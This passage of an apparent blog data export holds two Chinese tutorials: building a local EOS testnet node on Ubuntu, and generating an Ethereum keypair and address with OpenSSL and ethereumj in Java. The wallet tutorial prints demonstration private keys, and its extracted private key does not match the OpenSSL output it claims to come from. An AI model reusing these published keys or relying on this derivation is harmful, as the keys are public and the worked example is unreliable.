rel=\"noopener\">区块浏览器合约地址</a>。</p>\n"},{"title":"EOS本地节点搭建-Ubuntu环境","comments":0,"date":"2018-03-25T15:12:19.000Z","img":null,"_content":"本文编译环境为Ubuntu 16.04 LTS（腾讯云）。\n## 安装local testnet\n安装的过程主要参照[官方文档](https://github.com/EOSIO/eos#autoubuntulocal)\n```\ngit clone https://github.com/eosio/eos --recursive\ncd eos\n./eosio_build.sh\n```\n这个过程持续大约十分钟，当屏幕提示\"EOSIO has been successfully built.\"时，安装完成。\n![image](/images/eos_build.png)\n\n## 单节点testnet配置、运行\n按照文档进行[单节点测试运行](https://github.com/EOSIO/eos#creating-and-launching-a-single-node-testnet)配置。\n在进入build/programs/nodeos目录下，运行nodeos,运行结果如下：\n![image](/images/nodeos_try1.png)\n并没有出现文档中所说的报错退出，等待一分钟后，强制退出(Ctrl + C)。查看nodeos目录，并没有创建data-dir，也没有创建配置文件config.ini。\n![image](/images/nodeos_ls1.png)\n查看Issues，发现有人遇到了一样的问题，上面有人给出的解决方案是使用config-dir命令自己创建，使用如下命令:\n```\n./nodeos --config-dir data-dir/\n```\n查看nodeos目录，发现多出了data-dir文件夹，进入data-dir，可以看到配置文件config.ini。按照文档提示，对配置文件进行修改：\n```\n# Load the testnet genesis state, which creates some initial block producers with the default key\ngenesis-json = \"genesis.json\"\n# Enable production on a stale chain, since a single-node test chain is pretty much always stale\nenable-stale-production = true\n# Enable block production with the testnet producers\nproducer-name = inita\nproducer-name = initb\nproducer-name = initc\nproducer-name = initd\nproducer-name = inite\nproducer-name = initf\nproducer-name = initg\nproducer-name = inith\nproducer-name = initi\nproducer-name = initj\nproducer-name = initk\nproducer-name = initl\nproducer-name = initm\nproducer-name = initn\nproducer-name = inito\nproducer-name = initp\nproducer-name = initq\nproducer-name = initr\nproducer-name = inits\nproducer-name = initt\nproducer-name = initu\n# Load the block producer plugin, so you can produce blocks\nplugin = eosio::producer_plugin\n# Wallet plugin\nplugin = eosio::wallet_api_plugin\n# As well as API and HTTP plugins\nplugin = eosio::chain_api_plugin\nplugin = eosio::http_plugin\n```\n在配置genesis-json的时候，我们发现在eos目录下存在一个genesis.json文件，将之拷贝到data-dir目录下，原有配置不用修改。\n再次运行nodeos，发现还是没有办法正常出块，而文档中也没有给出相应的说明。没办法，只能回过头来再次检查之前的配置，而最终解决这个问题也存在一定的偶然性，当我新开一个窗口，同时运行nodeos的时候，给出了如下提示：\n![image](/images/eos_node00.png)\n我们发现nodeos读取的是eos/build/etc/eosio/node_00目录下的genesis.json，而当我们进入到node_00目录下的时候，发现该目录下也生成了一个config.ini文件，其生成时间与执行nodeos -- config-dir的时间相同，这说明nodeos默认读取该目录下的配置文件，而我们刚才的配置无效，于是将data-dir目录下的config.ini覆盖掉node_00目录下的config.ini。\n再次启动nodeos，发现正常启动。\n![image](/images/nodeos_not_my_turn.png)\n等待一定时间后，我们发现依然没有正常的出块，同时给出提示信息\"Not producing block because it isn't my turn, its eosio\"\n我们知道eos使用的是DPOS共识模式，而在config.ini中我们配置了21个producer,那么是否是因为eosio是eos在local testnet下的默认节点，而配置文件中没有对应的producer导致的呢？ 我在producer-name = initu 下增加了 producer-name = eosio 再次运行nodeos，发现nodeos运行正常，成功出块，只是块中没有交易。\n![image](/images/nodeos_produce_blocks.png)\n至此，我便完成了eos本地节点的搭建，由于eos代码更新较快，官方文档没有同步更新，踩了许多了坑，特此记录。\n","source":"_posts/EOS本地节点搭建-Ubuntu环境.md","raw":"---\ntitle: EOS本地节点搭建-Ubuntu环境\ncomments: false\ndate: 2018-03-25 23:12:19\ncategories: 区块链\ntags:\n- LeonBCK\n- EOS\nimg:\n---\n本文编译环境为Ubuntu 16.04 LTS（腾讯云）。\n## 安装local testnet\n安装的过程主要参照[官方文档](https://github.com/EOSIO/eos#autoubuntulocal)\n```\ngit clone https://github.com/eosio/eos --recursive\ncd eos\n./eosio_build.sh\n```\n这个过程持续大约十分钟，当屏幕提示\"EOSIO has been successfully built.\"时，安装完成。\n![image](/images/eos_build.png)\n\n## 单节点testnet配置、运行\n按照文档进行[单节点测试运行](https://github.com/EOSIO/eos#creating-and-launching-a-single-node-testnet)配置。\n在进入build/programs/nodeos目录下，运行nodeos,运行结果如下：\n![image](/images/nodeos_try1.png)\n并没有出现文档中所说的报错退出，等待一分钟后，强制退出(Ctrl + C)。查看nodeos目录，并没有创建data-dir，也没有创建配置文件config.ini。\n![image](/images/nodeos_ls1.png)\n查看Issues，发现有人遇到了一样的问题，上面有人给出的解决方案是使用config-dir命令自己创建，使用如下命令:\n```\n./nodeos --config-dir data-dir/\n```\n查看nodeos目录，发现多出了data-dir文件夹，进入data-dir，可以看到配置文件config.ini。按照文档提示，对配置文件进行修改：\n```\n# Load the testnet genesis state, which creates some initial block producers with the default key\ngenesis-json = \"genesis.json\"\n# Enable production on a stale chain, since a single-node test chain is pretty much always stale\nenable-stale-production = true\n# Enable block production with the testnet producers\nproducer-name = inita\nproducer-name = initb\nproducer-name = initc\nproducer-name = initd\nproducer-name = inite\nproducer-name = initf\nproducer-name = initg\nproducer-name = inith\nproducer-name = initi\nproducer-name = initj\nproducer-name = initk\nproducer-name = initl\nproducer-name = initm\nproducer-name = initn\nproducer-name = inito\nproducer-name = initp\nproducer-name = initq\nproducer-name = initr\nproducer-name = inits\nproducer-name = initt\nproducer-name = initu\n# Load the block producer plugin, so you can produce blocks\nplugin = eosio::producer_plugin\n# Wallet plugin\nplugin = eosio::wallet_api_plugin\n# As well as API and HTTP plugins\nplugin = eosio::chain_api_plugin\nplugin = eosio::http_plugin\n```\n在配置genesis-json的时候，我们发现在eos目录下存在一个genesis.json文件，将之拷贝到data-dir目录下，原有配置不用修改。\n再次运行nodeos，发现还是没有办法正常出块，而文档中也没有给出相应的说明。没办法，只能回过头来再次检查之前的配置，而最终解决这个问题也存在一定的偶然性，当我新开一个窗口，同时运行nodeos的时候，给出了如下提示：\n![image](/images/eos_node00.png)\n我们发现nodeos读取的是eos/build/etc/eosio/node_00目录下的genesis.json，而当我们进入到node_00目录下的时候，发现该目录下也生成了一个config.ini文件，其生成时间与执行nodeos -- config-dir的时间相同，这说明nodeos默认读取该目录下的配置文件，而我们刚才的配置无效，于是将data-dir目录下的config.ini覆盖掉node_00目录下的config.ini。\n再次启动nodeos，发现正常启动。\n![image](/images/nodeos_not_my_turn.png)\n等待一定时间后，我们发现依然没有正常的出块，同时给出提示信息\"Not producing block because it isn't my turn, its eosio\"\n我们知道eos使用的是DPOS共识模式，而在config.ini中我们配置了21个producer,那么是否是因为eosio是eos在local testnet下的默认节点，而配置文件中没有对应的producer导致的呢？ 我在producer-name = initu 下增加了 producer-name = eosio 再次运行nodeos，发现nodeos运行正常，成功出块，只是块中没有交易。\n![image](/images/nodeos_produce_blocks.png)\n至此，我便完成了eos本地节点的搭建，由于eos代码更新较快，官方文档没有同步更新，踩了许多了坑，特此记录。\n","slug":"EOS本地节点搭建-Ubuntu环境","published":1,"updated":"2018-03-26T04:00:59.844Z","layout":"post","photos":[],"link":"","_id":"cjf7piaux0004pkwojm85qmx8","content":"<p>本文编译环境为Ubuntu 16.04 LTS（腾讯云）。</p>\n<h2 id=\"安装local-testnet\"><a href=\"#安装local-testnet\" class=\"headerlink\" title=\"安装local testnet\"></a>安装local testnet</h2><p>安装的过程主要参照<a href=\"https://github.com/EOSIO/eos#autoubuntulocal\" target=\"_blank\" rel=\"noopener\">官方文档</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/eosio/eos --recursive</span><br><span class=\"line\">cd eos</span><br><span class=\"line\">./eosio_build.sh</span><br></pre></td></tr></table></figure></p>\n<p>这个过程持续大约十分钟，当屏幕提示”EOSIO has been successfully built.”时，安装完成。<br><img src=\"/images/eos_build.png\" alt=\"image\"></p>\n<h2 id=\"单节点testnet配置、运行\"><a href=\"#单节点testnet配置、运行\" class=\"headerlink\" title=\"单节点testnet配置、运行\"></a>单节点testnet配置、运行</h2><p>按照文档进行<a href=\"https://github.com/EOSIO/eos#creating-and-launching-a-single-node-testnet\" target=\"_blank\" rel=\"noopener\">单节点测试运行</a>配置。<br>在进入build/programs/nodeos目录下，运行nodeos,运行结果如下：<br><img src=\"/images/nodeos_try1.png\" alt=\"image\"><br>并没有出现文档中所说的报错退出，等待一分钟后，强制退出(Ctrl + C)。查看nodeos目录，并没有创建data-dir，也没有创建配置文件config.ini。<br><img src=\"/images/nodeos_ls1.png\" alt=\"image\"><br>查看Issues，发现有人遇到了一样的问题，上面有人给出的解决方案是使用config-dir命令自己创建，使用如下命令:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./nodeos --config-dir data-dir/</span><br></pre></td></tr></table></figure></p>\n<p>查看nodeos目录，发现多出了data-dir文件夹，进入data-dir，可以看到配置文件config.ini。按照文档提示，对配置文件进行修改：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Load the testnet genesis state, which creates some initial block producers with the default key</span><br><span class=\"line\">genesis-json = &quot;genesis.json&quot;</span><br><span class=\"line\"># Enable production on a stale chain, since a single-node test chain is pretty much always stale</span><br><span class=\"line\">enable-stale-production = true</span><br><span class=\"line\"># Enable block production with the testnet producers</span><br><span class=\"line\">producer-name = inita</span><br><span class=\"line\">producer-name = initb</span><br><span class=\"line\">producer-name = initc</span><br><span class=\"line\">producer-name = initd</span><br><span class=\"line\">producer-name = inite</span><br><span class=\"line\">producer-name = initf</span><br><span class=\"line\">producer-name = initg</span><br><span class=\"line\">producer-name = inith</span><br><span class=\"line\">producer-name = initi</span><br><span class=\"line\">producer-name = initj</span><br><span class=\"line\">producer-name = initk</span><br><span class=\"line\">producer-name = initl</span><br><span class=\"line\">producer-name = initm</span><br><span class=\"line\">producer-name = initn</span><br><span class=\"line\">producer-name = inito</span><br><span class=\"line\">producer-name = initp</span><br><span class=\"line\">producer-name = initq</span><br><span class=\"line\">producer-name = initr</span><br><span class=\"line\">producer-name = inits</span><br><span class=\"line\">producer-name = initt</span><br><span class=\"line\">producer-name = initu</span><br><span class=\"line\"># Load the block producer plugin, so you can produce blocks</span><br><span class=\"line\">plugin = eosio::producer_plugin</span><br><span class=\"line\"># Wallet plugin</span><br><span class=\"line\">plugin = eosio::wallet_api_plugin</span><br><span class=\"line\"># As well as API and HTTP plugins</span><br><span class=\"line\">plugin = eosio::chain_api_plugin</span><br><span class=\"line\">plugin = eosio::http_plugin</span><br></pre></td></tr></table></figure></p>\n<p>在配置genesis-json的时候，我们发现在eos目录下存在一个genesis.json文件，将之拷贝到data-dir目录下，原有配置不用修改。<br>再次运行nodeos，发现还是没有办法正常出块，而文档中也没有给出相应的说明。没办法，只能回过头来再次检查之前的配置，而最终解决这个问题也存在一定的偶然性，当我新开一个窗口，同时运行nodeos的时候，给出了如下提示：<br><img src=\"/images/eos_node00.png\" alt=\"image\"><br>我们发现nodeos读取的是eos/build/etc/eosio/node_00目录下的genesis.json，而当我们进入到node_00目录下的时候，发现该目录下也生成了一个config.ini文件，其生成时间与执行nodeos – config-dir的时间相同，这说明nodeos默认读取该目录下的配置文件，而我们刚才的配置无效，于是将data-dir目录下的config.ini覆盖掉node_00目录下的config.ini。<br>再次启动nodeos，发现正常启动。<br><img src=\"/images/nodeos_not_my_turn.png\" alt=\"image\"><br>等待一定时间后，我们发现依然没有正常的出块，同时给出提示信息”Not producing block because it isn’t my turn, its eosio”<br>我们知道eos使用的是DPOS共识模式，而在config.ini中我们配置了21个producer,那么是否是因为eosio是eos在local testnet下的默认节点，而配置文件中没有对应的producer导致的呢？ 我在producer-name = initu 下增加了 producer-name = eosio 再次运行nodeos，发现nodeos运行正常，成功出块，只是块中没有交易。<br><img src=\"/images/nodeos_produce_blocks.png\" alt=\"image\"><br>至此，我便完成了eos本地节点的搭建，由于eos代码更新较快，官方文档没有同步更新，踩了许多了坑，特此记录。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>本文编译环境为Ubuntu 16.04 LTS（腾讯云）。</p>\n<h2 id=\"安装local-testnet\"><a href=\"#安装local-testnet\" class=\"headerlink\" title=\"安装local testnet\"></a>安装local testnet</h2><p>安装的过程主要参照<a href=\"https://github.com/EOSIO/eos#autoubuntulocal\" target=\"_blank\" rel=\"noopener\">官方文档</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/eosio/eos --recursive</span><br><span class=\"line\">cd eos</span><br><span class=\"line\">./eosio_build.sh</span><br></pre></td></tr></table></figure></p>\n<p>这个过程持续大约十分钟，当屏幕提示”EOSIO has been successfully built.”时，安装完成。<br><img src=\"/images/eos_build.png\" alt=\"image\"></p>\n<h2 id=\"单节点testnet配置、运行\"><a href=\"#单节点testnet配置、运行\" class=\"headerlink\" title=\"单节点testnet配置、运行\"></a>单节点testnet配置、运行</h2><p>按照文档进行<a href=\"https://github.com/EOSIO/eos#creating-and-launching-a-single-node-testnet\" target=\"_blank\" rel=\"noopener\">单节点测试运行</a>配置。<br>在进入build/programs/nodeos目录下，运行nodeos,运行结果如下：<br><img src=\"/images/nodeos_try1.png\" alt=\"image\"><br>并没有出现文档中所说的报错退出，等待一分钟后，强制退出(Ctrl + C)。查看nodeos目录，并没有创建data-dir，也没有创建配置文件config.ini。<br><img src=\"/images/nodeos_ls1.png\" alt=\"image\"><br>查看Issues，发现有人遇到了一样的问题，上面有人给出的解决方案是使用config-dir命令自己创建，使用如下命令:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./nodeos --config-dir data-dir/</span><br></pre></td></tr></table></figure></p>\n<p>查看nodeos目录，发现多出了data-dir文件夹，进入data-dir，可以看到配置文件config.ini。按照文档提示，对配置文件进行修改：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Load the testnet genesis state, which creates some initial block producers with the default key</span><br><span class=\"line\">genesis-json = &quot;genesis.json&quot;</span><br><span class=\"line\"># Enable production on a stale chain, since a single-node test chain is pretty much always stale</span><br><span class=\"line\">enable-stale-production = true</span><br><span class=\"line\"># Enable block production with the testnet producers</span><br><span class=\"line\">producer-name = inita</span><br><span class=\"line\">producer-name = initb</span><br><span class=\"line\">producer-name = initc</span><br><span class=\"line\">producer-name = initd</span><br><span class=\"line\">producer-name = inite</span><br><span class=\"line\">producer-name = initf</span><br><span class=\"line\">producer-name = initg</span><br><span class=\"line\">producer-name = inith</span><br><span class=\"line\">producer-name = initi</span><br><span class=\"line\">producer-name = initj</span><br><span class=\"line\">producer-name = initk</span><br><span class=\"line\">producer-name = initl</span><br><span class=\"line\">producer-name = initm</span><br><span class=\"line\">producer-name = initn</span><br><span class=\"line\">producer-name = inito</span><br><span class=\"line\">producer-name = initp</span><br><span class=\"line\">producer-name = initq</span><br><span class=\"line\">producer-name = initr</span><br><span class=\"line\">producer-name = inits</span><br><span class=\"line\">producer-name = initt</span><br><span class=\"line\">producer-name = initu</span><br><span class=\"line\"># Load the block producer plugin, so you can produce blocks</span><br><span class=\"line\">plugin = eosio::producer_plugin</span><br><span class=\"line\"># Wallet plugin</span><br><span class=\"line\">plugin = eosio::wallet_api_plugin</span><br><span class=\"line\"># As well as API and HTTP plugins</span><br><span class=\"line\">plugin = eosio::chain_api_plugin</span><br><span class=\"line\">plugin = eosio::http_plugin</span><br></pre></td></tr></table></figure></p>\n<p>在配置genesis-json的时候，我们发现在eos目录下存在一个genesis.json文件，将之拷贝到data-dir目录下，原有配置不用修改。<br>再次运行nodeos，发现还是没有办法正常出块，而文档中也没有给出相应的说明。没办法，只能回过头来再次检查之前的配置，而最终解决这个问题也存在一定的偶然性，当我新开一个窗口，同时运行nodeos的时候，给出了如下提示：<br><img src=\"/images/eos_node00.png\" alt=\"image\"><br>我们发现nodeos读取的是eos/build/etc/eosio/node_00目录下的genesis.json，而当我们进入到node_00目录下的时候，发现该目录下也生成了一个config.ini文件，其生成时间与执行nodeos – config-dir的时间相同，这说明nodeos默认读取该目录下的配置文件，而我们刚才的配置无效，于是将data-dir目录下的config.ini覆盖掉node_00目录下的config.ini。<br>再次启动nodeos，发现正常启动。<br><img src=\"/images/nodeos_not_my_turn.png\" alt=\"image\"><br>等待一定时间后，我们发现依然没有正常的出块，同时给出提示信息”Not producing block because it isn’t my turn, its eosio”<br>我们知道eos使用的是DPOS共识模式，而在config.ini中我们配置了21个producer,那么是否是因为eosio是eos在local testnet下的默认节点，而配置文件中没有对应的producer导致的呢？ 我在producer-name = initu 下增加了 producer-name = eosio 再次运行nodeos，发现nodeos运行正常，成功出块，只是块中没有交易。<br><img src=\"/images/nodeos_produce_blocks.png\" alt=\"image\"><br>至此，我便完成了eos本地节点的搭建，由于eos代码更新较快，官方文档没有同步更新，踩了许多了坑，特此记录。</p>\n"},{"title":"Java中创建完整的以太坊钱包","comments":0,"date":"2018-03-11T01:11:02.000Z","img":null,"_content":"\n### Java中创建完整的以太坊钱包\n\n以太坊中生成秘钥分为三步\n1. 生成EC私钥\n2. 通过私钥推出公钥\n3. 通过公钥算出密码\n\n> ###### 以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\n\n* 我们用OpenSSL来生成一个钥私，并且显示他的私有和公告部分\n\n```\nopenssl ecparam -name secp256k1 -genkey -noout | openssl ec -text -noout \n\nread EC key\nPrivate-Key: (256 bit)\npriv:\n    00:bc:70:90:97:28:61:e0:92:72:74:c0:0f:b0:1d:\n    c6:4c:e0:bc:a9:32:a7:b1:d2:9e:a5:1e:cd:2c:21:\n    c2:e3:1d\npub: \n    04:0f:ff:81:4f:59:ac:83:93:2f:5c:6c:74:ea:69:\n    d4:75:74:9a:46:9a:f1:6e:eb:aa:2f:2a:59:d2:36:\n    5f:33:1f:7d:35:05:f5:57:15:11:3d:91:47:89:2d:\n    57:91:75:cc:cd:6e:61:e8:4c:b1:aa:cf:1d:fd:d7:\n    86:35:c4:55:c5\nASN1 OID: secp256k1\n```\n> ###### openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\n\n* 私钥部分\n\n```\ncat Key | grep priv -A 3 | tail -n +2 |  tr -d '\\n[:space:]:' | sed 's/^00//'\n\n884f0da48660a3c22257fc36be4210ec6f975924ea399e6478c7596b852f25c4\n```\n\n* 公钥部分\n\n```\n cat Key | grep pub -A 5 | tail -n +2 |tr -d '\\n[:space:]:' |sed 's/^04//'\n \nf35862b021183deb90cb66978fc6f7c4bb5ae3e10d486a8109458e0f1ebbdb4602ed1f864bc91cada3eef79b3fb020313850b27c958cdd7567e5c7b9d7f66780\n```\n> ###### 地址是取公钥后40个字符，通过keccak-256算法生成\n\n* 地址\n\n```\n cat pub | keccak-256sum -x -l | tr -d ' -' | tail -c 41\n \n 82a772a5c62b05cd51683872180a5dffef3a0c3e\n```\n\n接下来我们去[myetherwallet](https://www.myetherwallet.com/)验证一下这个钱包地址是否正确\n\n* 导入私钥\n\n![image](/images/address20180311.png)\n\n通过比对发现私钥地址一致。我们在Java中再进行生成对比一下。\n\n首先我们要导入[ethereum](https://github.com/ethereum/ethereumj)\n\nJava中钱包生成公私钥地址的方法都在org.ethereum.crypto.ECKey包中的ECKey类中\n\n通过源码我发现好像并没有提供直接通过私钥生成地址的方法,但是提供了一个可以通过私钥生成ECKey的构造方法，以及通过ECKey获取公钥，私钥，地址的方法\n\n```\n public static ECKey fromPrivate(byte[] privKeyBytes) {\n        return fromPrivate(new BigInteger(1, privKeyBytes));\n    }\n```\n\n\n```\n  @Nullable\n    public byte[] getPrivKeyBytes() {\n        return this.privKey == null?null:(this.privKey instanceof BCECPrivateKey?ByteUtil.bigIntegerToBytes(((BCECPrivateKey)this.privKey).getD(), 32):null);\n    }\n```\n\n```\n public ECPoint getPubKeyPoint() {\n        return this.pub;\n    }\n```\n\n\n```\n public byte[] getAddress() {\n        if(this.pubKeyHash == null) {\n            this.pubKeyHash = computeAddress(this.pub);\n        }\n\n        return this.pubKeyHash;\n    }\n```\n\n接下来根据这几个方法写一个测试类进行测试校验\n\n![image](/images/test20180311.png)\n\n发现私钥和地址是一样的公钥多了一个04的头部，去掉头部也是完全一样。\n\n那我们怎么生成一个钱包？再看源码还有一个空参构造方法可以构造一个ECKey\n\n```\n public ECKey() {\n        this(secureRandom);\n    }\n```\n\n我们生成一个钱包并在[myetherwallet](https://www.myetherwallet.com/)校验\n\n![image](/images/test_wallet20180311.png\n)\n\n![image](/images/wallet20180311.png\n)\n\n通过校验发现我们生成的钱包与mywallet中一致。\n\n\n\n参考：\n1. [Generating a usable Ethereum wallet and its corresponding keys](https://kobl.one/blog/create-full-ethereum-keypair-and-address/)\n2. [ethereumj](https://github.com/ethereum/ethereumj)\n","source":"_posts/Java中创建完整的以太坊钱包.md","raw":"---\ntitle: Java中创建完整的以太坊钱包\ncomments: false\ndate: 2018-03-11 09:11:02\ncategories: 钱包\ntags: \n- ciscolxh \n- 钱包\nimg:\n---\n\n### Java中创建完整的以太坊钱包\n\n以太坊中生成秘钥分为三步\n1. 生成EC私钥\n2. 通过私钥推出公钥\n3. 通过公钥算出密码\n\n> ###### 以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\n\n* 我们用OpenSSL来生成一个钥私，并且显示他的私有和公告部分\n\n```\nopenssl ecparam -name secp256k1 -genkey -noout | openssl ec -text -noout \n\nread EC key\nPrivate-Key: (256 bit)\npriv:\n    00:bc:70:90:97:28:61:e0:92:72:74:c0:0f:b0:1d:\n    c6:4c:e0:bc:a9:32:a7:b1:d2:9e:a5:1e:cd:2c:21:\n    c2:e3:1d\npub: \n    04:0f:ff:81:4f:59:ac:83:93:2f:5c:6c:74:ea:69:\n    d4:75:74:9a:46:9a:f1:6e:eb:aa:2f:2a:59:d2:36:\n    5f:33:1f:7d:35:05:f5:57:15:11:3d:91:47:89:2d:\n    57:91:75:cc:cd:6e:61:e8:4c:b1:aa:cf:1d:fd:d7:\n    86:35:c4:55:c5\nASN1 OID: secp256k1\n```\n> ###### openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\n\n* 私钥部分\n\n```\ncat Key | grep priv -A 3 | tail -n +2 |  tr -d '\\n[:space:]:' | sed 's/^00//'\n\n884f0da48660a3c22257fc36be4210ec6f975924ea399e6478c7596b852f25c4\n```\n\n* 公钥部分\n\n```\n cat Key | grep pub -A 5 | tail -n +2 |tr -d '\\n[:space:]:' |sed 's/^04//'\n \nf35862b021183deb90cb66978fc6f7c4bb5ae3e10d486a8109458e0f1ebbdb4602ed1f864bc91cada3eef79b3fb020313850b27c958cdd7567e5c7b9d7f66780\n```\n> ###### 地址是取公钥后40个字符，通过keccak-256算法生成\n\n* 地址\n\n```\n cat pub | keccak-256sum -x -l | tr -d ' -' | tail -c 41\n \n 82a772a5c62b05cd51683872180a5dffef3a0c3e\n```\n\n接下来我们去[myetherwallet](https://www.myetherwallet.com/)验证一下这个钱包地址是否正确\n\n* 导入私钥\n\n![image](/images/address20180311.png)\n\n通过比对发现私钥地址一致。我们在Java中再进行生成对比一下。\n\n首先我们要导入[ethereum](https://github.com/ethereum/ethereumj)\n\nJava中钱包生成公私钥地址的方法都在org.ethereum.crypto.ECKey包中的ECKey类中\n\n通过源码我发现好像并没有提供直接通过私钥生成地址的方法,但是提供了一个可以通过私钥生成ECKey的构造方法，以及通过ECKey获取公钥，私钥，地址的方法\n\n```\n public static ECKey fromPrivate(byte[] privKeyBytes) {\n        return fromPrivate(new BigInteger(1, privKeyBytes));\n    }\n```\n\n\n```\n  @Nullable\n    public byte[] getPrivKeyBytes() {\n        return this.privKey == null?null:(this.privKey instanceof BCECPrivateKey?ByteUtil.bigIntegerToBytes(((BCECPrivateKey)this.privKey).getD(), 32):null);\n    }\n```\n\n```\n public ECPoint getPubKeyPoint() {\n        return this.pub;\n    }\n```\n\n\n```\n public byte[] getAddress() {\n        if(this.pubKeyHash == null) {\n            this.pubKeyHash = computeAddress(this.pub);\n        }\n\n        return this.pubKeyHash;\n    }\n```\n\n接下来根据这几个方法写一个测试类进行测试校验\n\n![image](/images/test20180311.png)\n\n发现私钥和地址是一样的公钥多了一个04的头部，去掉头部也是完全一样。\n\n那我们怎么生成一个钱包？再看源码还有一个空参构造方法可以构造一个ECKey\n\n```\n public ECKey() {\n        this(secureRandom);\n    }\n```\n\n我们生成一个钱包并在[myetherwallet](https://www.myetherwallet.com/)校验\n\n![image](/images/test_wallet20180311.png\n)\n\n![image](/images/wallet20180311.png\n)\n\n通过校验发现我们生成的钱包与mywallet中一致。\n\n\n\n参考：\n1. [Generating a usable Ethereum wallet and its corresponding keys](https://kobl.one/blog/create-full-ethereum-keypair-and-address/)\n2. [ethereumj](https://github.com/ethereum/ethereumj)\n","slug":"Java中创建完整的以太坊钱包","published":1,"updated":"2018-03-11T01:26:15.868Z","layout":"post","photos":[],"link":"","_id":"cjf7piauz0005pkwo5ocr6mom","content":"<h3 id=\"Java中创建完整的以太坊钱包\"><a href=\"#Java中创建完整的以太坊钱包\" class=\"headerlink\" title=\"Java中创建完整的以太坊钱包\"></a>Java中创建完整的以太坊钱包</h3><p>以太坊中生成秘钥分为三步</p>\n<ol>\n<li>生成EC私钥</li>\n<li>通过私钥推出公钥</li>\n<li>通过公钥算出密码</li>\n</ol>\n<blockquote>\n<h6 id=\"以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\"><a href=\"#以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\" class=\"headerlink\" title=\"以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\"></a>以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成</h6></blockquote>\n<ul>\n<li>我们用OpenSSL来生成一个钥私，并且显示他的私有和公告部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl ecparam -name secp256k1 -genkey -noout | openssl ec -text -noout </span><br><span class=\"line\"></span><br><span class=\"line\">read EC key</span><br><span class=\"line\">Private-Key: (256 bit)</span><br><span class=\"line\">priv:</span><br><span class=\"line\">    00:bc:70:90:97:28:61:e0:92:72:74:c0:0f:b0:1d:</span><br><span class=\"line\">    c6:4c:e0:bc:a9:32:a7:b1:d2:9e:a5:1e:cd:2c:21:</span><br><span class=\"line\">    c2:e3:1d</span><br><span class=\"line\">pub: </span><br><span class=\"line\">    04:0f:ff:81:4f:59:ac:83:93:2f:5c:6c:74:ea:69:</span><br><span class=\"line\">    d4:75:74:9a:46:9a:f1:6e:eb:aa:2f:2a:59:d2:36:</span><br><span class=\"line\">    5f:33:1f:7d:35:05:f5:57:15:11:3d:91:47:89:2d:</span><br><span class=\"line\">    